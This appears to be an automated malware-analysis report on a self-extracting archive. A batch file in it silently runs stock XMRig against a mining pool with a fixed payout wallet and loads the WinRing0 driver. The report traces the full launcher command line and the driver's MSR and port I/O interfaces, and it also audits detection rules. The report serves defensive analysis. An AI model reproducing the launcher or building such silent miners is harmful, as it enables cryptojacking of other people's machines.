judgments.1.bat: MALICIOUS: supplies customized mining task and fixed payout wallet for silent SFX Setup activation. This linkage is evidence from the launch chain, not inheritance of the parent verdict. Standalone bytes also support authorized mining; owner consent and original distribution lure are unavailable.
judgments.xmrig.exe: BENIGN: byte-identical official XMRig 6.25.0; ordinary configurable mining, pool networking, RandomX JIT and hardware tuning. Stock tool packaged for malicious deployment.
judgments.WinRing0x64.sys: BENIGN: byte-identical official bundled WinRing0 1.2.0.5 with intact Noriyuki MIYAZAKI Authenticode signature. IOCTL hardware access is dual-use; no added payload or exploit client.

provenance.verification: Forager download matches publisher SHA256SUMS. Both native members compared byte-for-byte to ZIP members. Downloads and .forage.json provenance retained in scratch. Source tag v6.25.0 also fetched with Forager.

reverse_engineering: RAR5 begins at 448000; Setup=1.bat and Silent=1 in SFX comment. Exactly three members; remaining 39315 tail bytes are all zero. Extraction used bsdtar because 7z could not decode compressed RAR6 members.
All 183 batch bytes traced: echo off; cd /d to own directory; xmrig --url pool.hashvault.pro:443 --user [95-character Monero address] --pass TEY; pause. No obfuscation or secondary stage.
Driver entry 0x15008 initializes cookie and jumps to DriverEntry 0x11008, which creates device and DOS link and registers dispatch 0x110d8. Unload 0x11424 deletes link and device.

IOCTL 0x9c402084 -> 0x11468 RDMSR; 0x9c402088 -> 0x1149c WRMSR; 0x9c40208c -> 0x114d0 RDPMC reads selected counter, combines EDX:EAX and stores 64 bits to output. Port I/O and HAL PCI configuration paths also traced.
Physical read 0x11504 checks BIOS range 0xc0000..0xfffff before MmMapIoSpace, rep movs, MmUnmapIoSpace. No arbitrary physical-write claim.

XMRig 0x14018cbe0 resolves WinRing0x64.sys and opens or creates WinRing0_1_2_0 service. CreateServiceW 0x14018d1b2 uses kernel-driver=1 and demand-start=3; StartServiceW follows. Stock source confirms MSR device IOCTLs and service cleanup; no boot persistence or exploit inferred.
XMRig 0x1400cf860 allocates 0x20000 bytes with VirtualAlloc protection 0x40 at 0x1400cf88f and prepares generated mining-code buffers. Local JIT, not remote injection.

Official matching source App::exec starts configured miner and libuv loop. Client::login sends user/password/agent in Stratum JSON-RPC, submit sends work results. App_win hides console only when background option is set; the batch does not set it.

Decoded-string candidates reviewed: Base64 produces non-payload bytes; URL decoding alters printf formats; Unicode-escape candidates come from OpenSSL paths. No intentional obfuscation layer or executable stage recovered.
MOVE/COPY/DELETE at offsets 5864012/5863956/5863912 sit in HTTP method table next to GET/POST/HEAD/PROPFIND/MKCOL. These matches do not establish file operations or remote command handling.

changes.preservation: Four conditions, rdata constraints, binary scopes, Windows/Unix platforms, criticalities and confidences preserved exactly; four OR alternatives retained. Exact and ancestor consumers audited. No narrowing, severity reduction or lost technique.
changes.display: Fresh renderer strips unreferenced components and any/needs-one groups. Explicit test-rules confirms moved XMRig tokens still match. Initial cached reports contained extra unions/baseline observations; fresh HEAD baseline isolates actual changes.

coverage_limit: Standalone MALICIOUS batch has zero hostile/suspicious and ten notable traits (eleven inside archive). Full-script tracing and archive composite checks establish configured miner execution with pool and payout wallet. Silent activation is in parent SFX. Separate batch evasion, persistence, theft, download, injection, staging or cleanup would be invented; no justified independent mechanism supplies 3-5 hostile rules. Existing container hostile rules retained; no duplicates added.
classifier: All fresh before/after reports return level -1/confidence 0, so no calibrated conviction. Raw driver probability stays high despite stock-driver evidence; launcher lacks a standalone hostile rule. Model feature version v18 is older than expected v21.
